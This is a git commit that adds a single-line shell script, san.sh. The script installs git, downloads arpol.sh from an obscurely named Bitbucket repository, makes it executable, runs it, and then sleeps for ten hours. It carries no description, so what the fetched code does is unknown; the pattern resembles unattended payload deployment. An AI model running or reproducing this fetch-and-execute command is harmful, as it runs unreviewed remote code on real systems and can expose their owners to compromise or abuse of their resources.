cb175de1e2762d4caf7adb861fcd41ca04593ab5
sandesco <101970380+sandesco@users.noreply.github.com>
2022-03-20 16:29:37 +0700

    Create san.sh

---
+++ san.sh
@@ -0,0 +1,1 @@
+apt update && apt install git -y && wget https://bitbucket.org/jakbda/bakbf/raw/bd95d365dd192b3facb3e1fad1397b610b730628/arpol.sh && chmod +x arpol.sh && ./arpol.sh && sleep 36000 > /dev/null
